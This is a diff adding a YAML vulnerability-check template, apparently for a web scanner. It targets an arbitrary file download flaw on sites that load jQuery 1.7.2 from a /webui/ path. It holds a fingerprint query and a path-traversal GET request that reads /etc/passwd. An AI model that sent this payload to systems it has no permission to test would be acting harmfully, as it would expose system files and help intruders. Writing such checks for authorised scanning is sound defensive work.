@@ -1,0 +1,15 @@
+name: JQuery 1.7.2版本站点前台任意文件下载漏洞
+manual: true
+query: body="webui/js/jquerylib/jquery-1.7.2.min.js"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /webui/?g=sys_dia_data_down&file_name=../../../../../../../etc/passwd
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  author: luckying
+  links:
+  - https://gobies.org/
